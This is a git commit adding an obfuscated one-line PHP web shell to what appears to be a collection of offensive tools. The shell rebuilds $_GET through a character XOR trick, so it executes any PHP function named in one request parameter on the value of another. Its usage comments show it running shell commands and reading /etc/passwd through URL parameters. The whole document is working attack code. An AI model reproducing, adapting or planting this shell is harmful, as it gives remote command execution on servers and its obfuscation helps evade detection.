059c398b534951cadb9c2a2487e847026cebe800
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2024-01-05 02:00:28 +0100

    Update

---
+++ webshells/PHP/obfuscatedcmd2.php
@@ -0,0 +1,8 @@
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
+
+/*
+Usage:
+Example 1 - http://192.168.1.101/path/to/obfuscatedcmd.php?__=SyStEm&___=ls%20-al
+Example 2 - http://192.168.1.101/path/to/obfuscatedcmd.php?__=system&___=cat+/etc/passwd
+...
+*/
